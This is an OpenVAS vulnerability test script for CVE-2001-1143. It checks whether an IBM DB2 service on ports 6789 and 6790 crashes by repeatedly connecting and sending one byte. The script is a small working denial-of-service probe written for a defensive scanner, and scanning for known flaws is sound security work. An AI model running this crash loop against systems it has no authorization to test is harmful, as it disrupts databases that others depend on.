# OpenVAS Vulnerability Test
# $Id: db2_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: DB2 DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>, starting 
# from miscflood.nasl
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to crash
the DB2 database by sending just one byte to it.

An attacker  may use this attack to make this
service crash continuously, preventing you
from working properly.";

tag_solution = "upgrade your software";

if(description)
{
 script_id(10871);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(3010);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_tag(name:"risk_factor", value:"Medium");
 script_cve_id("CVE-2001-1143");
 name = "DB2 DOS";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;



 script_description(desc);
 
 summary = "Flood against the remote service";
 script_summary(summary);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";

 script_family(family);
 script_require_ports(6789, 6790);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#

function test_db2_port(port)
{
 if (! get_port_state(port))
  return(0);

 soc = open_sock_tcp(port);
 if (!soc)
  return(0);
 for (i=0; i<100; i=i+1)
 {
  send(socket:soc, data:string("x"));
  close(soc);

  soc = open_sock_tcp(port);
  if (! soc)
  {
   sleep(1);
   soc = open_sock_tcp(port);
   if (! soc)
   {
    security_warning(port);
    return (1);
   }
  }
 }
 close(soc);
 return(1);
}

test_db2_port(port:6789);
test_db2_port(port:6790);

